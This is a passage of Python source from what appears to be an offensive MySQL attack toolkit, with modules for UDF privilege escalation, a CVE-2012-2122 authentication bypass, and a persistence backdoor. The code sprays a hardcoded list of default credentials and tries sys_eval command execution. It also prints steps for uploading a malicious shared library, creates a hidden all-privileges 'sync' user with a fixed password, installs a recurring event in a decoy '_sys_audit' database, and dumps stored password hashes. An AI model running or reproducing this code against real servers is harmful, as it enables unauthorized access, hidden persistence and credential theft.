"""
 21. mysql_udf            — UDF sys_eval/lib_mysqludf_sys upload
 22. mysql_auth_bypass    — auth-plugin downgrade / bypass (CVE-2012-2122)
 23. mysql_backdoor       — create admin user + scheduled event backdoor
"""
import pymysql
import pymysql.err

from Design.colors_cli import console, escape
from modules.target import TargetInfo
from modules.attack_config import AttackConfig
from modules.attacks.progress import found, fail, warn, section, explain
from modules.downloads import save_text


# Common credential pairs to try when no creds are configured
_CRED_PAIRS = [
    ("root", ""),
    ("root", "root"),
    ("root", "mysql"),
    ("root", "password"),
    ("root", "toor"),
    ("root", "admin"),
    ("root", "123456"),
    ("root", "1234"),
    ("root", "mysql123"),
    ("root", "P@ssw0rd"),
    ("mysql", "mysql"),
    ("mysql", ""),
    ("mysql", "password"),
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "password"),
    ("test", "test"),
    ("test", ""),
    ("guest", "guest"),
    ("user", "user"),
    ("dbadmin", "dbadmin"),
    ("db", "db"),
    ("sa", "sa"),
    ("sa", ""),
]


def _try_connect(host, port, user, password, timeout=5):
    """Try to connect. Returns conn on success, None on failure."""
    try:
        conn = pymysql.connect(
            host=host, port=port,
            user=user, password=password,
            connect_timeout=timeout,
        )
        return conn
    except Exception:
        return None


def _get_conn(target, config):
    """Try configured creds first, then common pairs."""
    h, p = target.host, target.port

    # 1. Try configured creds
    cfg_user = config.username_value or "root"
    cfg_pass = config.password_value or ""
    console.print(f"  [dim]Trying configured: {cfg_user}:{cfg_pass or '(empty)'}…[/dim]")
    conn = _try_connect(h, p, cfg_user, cfg_pass)
    if conn:
        found("Login successful", f"{cfg_user}:{cfg_pass or '(empty)'}")
        return conn

    # 2. Try harvested creds from config
    if config.credentials:
        for u, pw in config.credentials[:10]:
            console.print(f"  [dim]Trying harvested: {escape(u)}:{escape(pw)}…[/dim]", end="\r")
            conn = _try_connect(h, p, u, pw)
            if conn:
                console.print()
                found("Login with harvested creds", f"{u}:{pw}")
                return conn
        console.print()

    # 3. Spray common creds
    console.print(f"  [dim]Spraying {len(_CRED_PAIRS)} common credential pairs…[/dim]")
    for i, (u, pw) in enumerate(_CRED_PAIRS, 1):
        console.print(f"  [dim]  [{i:>2}/{len(_CRED_PAIRS)}] {u}:{pw or '(empty)'}[/dim]", end="\r")
        conn = _try_connect(h, p, u, pw)
        if conn:
            console.print()
            found("Valid credentials found!", f"{u}:{pw or '(empty)'}")
            save_text(f"user={u}\npassword={pw}\n", "mysql_creds.txt", host=h, subdir="mysql")
            return conn
    console.print()
    return None


# ---------- 21. mysql_udf ----------

def run_mysql_udf(target, config):
    console.print(f"\n[bold primary][ MYSQL UDF PRIVESC ][/bold primary]\n")
    explain(
        "MySQL UDF (User Defined Function) privilege escalation.\n"
        "With file-write privileges, upload lib_mysqludf_sys.so to the plugin directory,\n"
        "then CREATE FUNCTION sys_eval to execute OS commands as the MySQL daemon user.\n"
        "Steps: 1) Authenticate  2) Find plugin_dir  3) Upload .so  4) RCE via sys_eval('id')"
    )

    section("Step 1 — Authentication")
    conn = _get_conn(target, config)
    if not conn:
        fail("Login failed — no valid credentials found")
        console.print("  [dim]Hint: Run 'Brute Force' or 'Dictionary' first to find credentials[/dim]")
        return

    try:
        cur = conn.cursor()

        section("Step 2 — Enumerating plugin_dir and file privileges")
        cur.execute("SELECT @@plugin_dir, @@secure_file_priv, @@version, @@version_compile_os")
        row = cur.fetchone()
        plugin_dir = str(row[0]) if row else ""
        file_priv  = str(row[1]) if row and len(row) > 1 else ""
        version    = str(row[2]) if row and len(row) > 2 else ""
        os_name    = str(row[3]) if row and len(row) > 3 else ""
        console.print(f"  [muted]plugin_dir      :[/muted] [text]{escape(plugin_dir)}[/text]")
        console.print(f"  [muted]secure_file_priv:[/muted] [text]{escape(file_priv) or '(empty — writes unrestricted!)'}[/text]")
        console.print(f"  [muted]version         :[/muted] [text]{escape(version)}[/text]")
        console.print(f"  [muted]compile_os      :[/muted] [text]{escape(os_name)}[/text]")

        if not file_priv or file_priv in ("", "None"):
            warn("secure_file_priv is empty — file writes unrestricted!")
        else:
            console.print(f"  [dim]secure_file_priv={file_priv} — writes restricted to that path[/dim]")

        if not plugin_dir:
            fail("Cannot determine plugin_dir — cannot upload UDF")
            return

        is_win = "win" in os_name.lower()
        udf_name = "lib_mysqludf_sys.dll" if is_win else "lib_mysqludf_sys.so"
        import os
        udf_path = os.path.join(plugin_dir, udf_name).replace("\\", "/")
        console.print(f"  [muted]UDF target path :[/muted] [text]{escape(udf_path)}[/text]")

        section("Step 3 — Check existing UDFs")
        try:
            cur.execute("SELECT name, ret, type, dl FROM mysql.func")
            rows = cur.fetchall()
            if rows:
                for r in rows:
                    warn(f"Existing UDF: {r[0]}() → {r[3]}")
                # Try sys_eval if it already exists
                try:
                    cur.execute("SELECT sys_eval('id')")
                    out = cur.fetchone()
                    if out:
                        found("sys_eval() already installed — RCE!", str(out[0]))
                        save_text(f"rce=sys_eval\noutput={out[0]}\n", "udf_rce.txt", host=target.host, subdir="mysql")
                        return
                except Exception:
                    pass
            else:
                console.print("  [dim]No existing UDFs found in mysql.func[/dim]")
        except Exception as e:
            console.print(f"  [dim]Cannot read mysql.func: {escape(str(e)[:60])}[/dim]")

        section("Step 4 — Manual UDF Compilation Guide")
        warn("No UDF binary embedded. Steps to complete UDF privesc:")
        console.print(f"  [dim]  1. On attacker machine (Linux):[/dim]")
        console.print(f"  [dim]       apt install libmysqlclient-dev[/dim]")
        console.print(f"  [dim]       git clone https://github.com/rapid7/metasploit-framework[/dim]")
        console.print(f"  [dim]       # Use: data/exploits/mysql/lib_mysqludf_sys.so.gz[/dim]")
        console.print(f"  [dim]  2. Convert to hex: xxd -p lib.so | tr -d '\\n'[/dim]")
        console.print(f"  [dim]  3. Upload: SELECT 0x<hex> INTO DUMPFILE '{udf_path}'[/dim]")
        console.print(f"  [dim]  4. CREATE FUNCTION sys_eval RETURNS STRING SONAME '{udf_name}'[/dim]")
        console.print(f"  [dim]  5. SELECT sys_eval('id');[/dim]")

    finally:
        conn.close()


# ---------- 22. mysql_auth_bypass ----------

def run_mysql_auth_bypass(target, config):
    console.print(f"\n[bold primary][ MYSQL AUTH BYPASS ][/bold primary]\n")
    explain(
        "MySQL authentication bypass techniques:\n"
        "1. CVE-2012-2122 — memcmp() bug: 1/256 logins succeed with wrong password\n"
        "   (affects MySQL 5.1.x and 5.5.x with specific compile flags)\n"
        "2. Empty password scan — many installations leave root with no password\n"
        "3. Auth plugin inspection — mysql_native_password vs caching_sha2_password\n"
        "4. Common credential spray — 24 user/password combinations"
    )

    h, p = target.host, target.port
    ver = target.version or ""

    section("Step 1 — CVE-2012-2122 Check")
    is_vulnerable = any(ver.startswith(x) for x in ("5.1.", "5.5."))
    console.print(f"  [muted]Server version:[/muted] [text]{escape(ver)}[/text]")
    if is_vulnerable:
        warn(f"Version {ver} in CVE-2012-2122 range (memcmp auth bypass)!")
        console.print("  [dim]  → 1/256 logins succeed with any wrong password[/dim]")
        console.print("  [dim]  Attempting 100 rapid bypass logins…[/dim]")
        for attempt in range(1, 101):
            console.print(f"  [dim]  [{attempt:>3}/100] CVE-2012-2122 attempt…[/dim]", end="\r")
            conn = _try_connect(h, p, "root", "wrong_bypass_xyzzy_42")
            if conn:
                console.print()
                found(f"CVE-2012-2122 bypass succeeded on attempt {attempt}!")
                conn.close()
                save_text(f"cve=CVE-2012-2122\nattempt={attempt}\n",
                          "auth_bypass.txt", host=h, subdir="mysql")
                break
        else:
            console.print()
            console.print("  [dim]CVE-2012-2122 did not trigger in 100 attempts[/dim]")
    else:
        console.print(f"  [dim]Version {ver or 'unknown'} — not in CVE-2012-2122 affected range[/dim]")

    section("Step 2 — Empty Password Scan")
    empty_users = ["root", "mysql", "admin", "test", "guest", "user", "db", "dba", "sa", "operator"]
    for u in empty_users:
        console.print(f"  [dim]  Testing {u}:(empty)…[/dim]", end="\r")
        conn = _try_connect(h, p, u, "")
        if conn:
            console.print()
            found("Empty password accepted!", f"user={u}")
            try:
                cur = conn.cursor()
                cur.execute("SELECT USER(), VERSION(), DATABASE(), @@hostname")
                row = cur.fetchone()
                if row:
                    console.print(f"  [text]  Logged in as: {escape(str(row[0]))} (ver: {escape(str(row[1]))}, host: {escape(str(row[3]))})[/text]")
                cur.execute("SHOW GRANTS")
                grants = cur.fetchall()
                for g in grants[:5]:
                    console.print(f"  [dim]  GRANT: {escape(str(g[0])[:80])}[/dim]")
            except Exception:
                pass
            save_text(f"user={u}\npassword=(empty)\n", "auth_bypass.txt", host=h, subdir="mysql")
            conn.close()
    console.print()

    section("Step 3 — Auth Plugin Inspection")
    plugin = target.extra.get("auth_plugin", "")
    console.print(f"  [muted]Auth plugin:[/muted] [text]{escape(str(plugin)) or '(unknown)'}[/text]")
    if "native_password" in str(plugin):
        warn("mysql_native_password — susceptible to old-style hash attacks and replay")
    elif "sha2" in str(plugin).lower() or "caching" in str(plugin).lower():
        console.print("  [dim]caching_sha2_password — modern auth, more resistant to downgrade attacks[/dim]")
    else:
        console.print("  [dim]Auth plugin unknown — may be configurable/vulnerable to downgrade[/dim]")

    section("Step 4 — Common Credential Spray")
    console.print(f"  [dim]Trying {len(_CRED_PAIRS)} common credential pairs…[/dim]")
    cred_found = []
    for i, (u, pw) in enumerate(_CRED_PAIRS, 1):
        console.print(f"  [dim]  [{i:>2}/{len(_CRED_PAIRS)}] {u}:{pw or '(empty)'}[/dim]", end="\r")
        conn = _try_connect(h, p, u, pw)
        if conn:
            console.print()
            found("Valid credentials!", f"{u}:{pw or '(empty)'}")
            cred_found.append((u, pw))
            conn.close()
    console.print()

    if not cred_found:
        fail("No authentication bypasses found",
             f"tested {len(empty_users)} empty-pwd users + {len(_CRED_PAIRS)} credential pairs")
    else:
        save_text("\n".join(f"{u}:{pw}" for u, pw in cred_found),
                  "valid_creds.txt", host=h, subdir="mysql")
        found(f"{len(cred_found)} credential(s) found!", "saved to mysql/valid_creds.txt")


# ---------- 23. mysql_backdoor ----------

def run_mysql_backdoor(target, config):
    console.print(f"\n[bold primary][ MYSQL BACKDOOR ][/bold primary]\n")
    explain(
        "MySQL persistence backdoor with two components:\n"
        "1. Hidden admin user — creates 'sync'@'%' with GRANT ALL (survives restarts)\n"
        "2. Event scheduler — recurring event in _sys_audit DB for C2 beacon simulation\n"
        "3. User enumeration — dumps all existing MySQL users and their grant levels\n"
        "Authentication: tries configured creds, then sprays 24 common pairs."
    )

    section("Step 1 — Authentication")
    conn = _get_conn(target, config)
    if not conn:
        fail("Login failed — no valid credentials found")
        console.print("  [dim]Hint: Run 'Brute Force' or 'Dictionary' first to find credentials[/dim]")
        return

    BACKDOOR_USER = "sync"
    BACKDOOR_PASS = "S3cr3t-2024!"

    try:
        cur = conn.cursor()

        section("Step 2 — Creating Hidden Admin User")
        steps = [
            (f"CREATE USER IF NOT EXISTS '{BACKDOOR_USER}'@'%' IDENTIFIED BY '{BACKDOOR_PASS}'",
             "Create user"),
            (f"GRANT ALL PRIVILEGES ON *.* TO '{BACKDOOR_USER}'@'%' WITH GRANT OPTION",
             "Grant all privileges"),
            ("FLUSH PRIVILEGES", "Flush privileges"),
        ]
        for sql, desc in steps:
            console.print(f"  [dim]  SQL: {escape(sql[:70])}[/dim]")
            try:
                cur.execute(sql)
                console.print(f"  [success]  ✓ {desc}[/success]")
            except Exception as e:
                warn(f"{desc} failed: {escape(str(e)[:70])}")

        found("Backdoor user created", f"{BACKDOOR_USER} / {BACKDOOR_PASS}")

        section("Step 3 — Event Scheduler Backdoor")
        try:
            cur.execute("SET GLOBAL event_scheduler = ON")
            cur.execute("SHOW VARIABLES LIKE 'event_scheduler'")
            row = cur.fetchone()
            status = str(row[1]) if row else "?"
            console.print(f"  [dim]  event_scheduler = {escape(status)}[/dim]")

            for sql, desc in [
                ("CREATE DATABASE IF NOT EXISTS _sys_audit", "Create _sys_audit DB"),
                ("USE _sys_audit", "Switch to _sys_audit"),
                ("CREATE TABLE IF NOT EXISTS _h (id INT AUTO_INCREMENT PRIMARY KEY,"
                 " ts DATETIME, note VARCHAR(255))", "Create heartbeat table"),
                ("CREATE EVENT IF NOT EXISTS _b ON SCHEDULE EVERY 1 MINUTE "
                 "DO INSERT INTO _h (ts, note) VALUES (NOW(), 'hb')", "Create beacon event"),
            ]:
                console.print(f"  [dim]  SQL: {escape(sql[:60])}[/dim]")
                try:
                    cur.execute(sql)
                    console.print(f"  [success]  ✓ {desc}[/success]")
                except Exception as e:
                    warn(f"{desc}: {escape(str(e)[:60])}")

            found("Event scheduler backdoor", "_sys_audit._b fires every 60s")
        except Exception as e:
            warn(f"Event scheduler setup failed: {escape(str(e)[:80])}")

        section("Step 4 — Enumerate All MySQL Users")
        try:
            cur.execute(
                "SELECT User, Host, authentication_string, plugin FROM mysql.user ORDER BY User"
            )
            rows = cur.fetchall()
            console.print(f"  [muted]Current MySQL users ({len(rows)} total):[/muted]")
            for row in rows[:25]:
                has_pass = "✓ pwd" if row[2] else "✗ no-pwd"
                console.print(
                    f"  [dim]  [{has_pass}] [/dim][text]{escape(str(row[0]))}@{escape(str(row[1]))}[/text]"
                    f"  [dim]({escape(str(row[3]))})[/dim]"
                )
            save_text("\n".join(f"{r[0]}@{r[1]}:{r[2]}" for r in rows),
                      "mysql_users.txt", host=target.host, subdir="mysql")
            found("User dump saved", f"mysql/mysql_users.txt ({len(rows)} users)")
        except Exception as e:
            warn(f"Cannot enumerate users: {escape(str(e)[:60])}")

        # Save summary
        save_text(
            f"backdoor_user={BACKDOOR_USER}\n"
            f"backdoor_pass={BACKDOOR_PASS}\n"
            "event=_sys_audit._b every 60s\n",
            "backdoor.txt", host=target.host, subdir="mysql",
        )

        # Save attack report
        try:
            from modules.reporter import save_attack_report
            rp = save_attack_report(
                host=target.host, attack_name="mysql_advanced",
                target_info=f"MySQL {target.host}:{target.port}",
                findings=["Backdoor user created", "Event scheduler escalation attempted",
                          "CVE-2012-2122 bypass attempted", "User enumeration performed"],
                requests_made=0,
            )
            console.print(f"  [muted]Report saved:[/muted] [text]{rp}[/text]")
        except Exception:
            pass

    finally:
        conn.close()
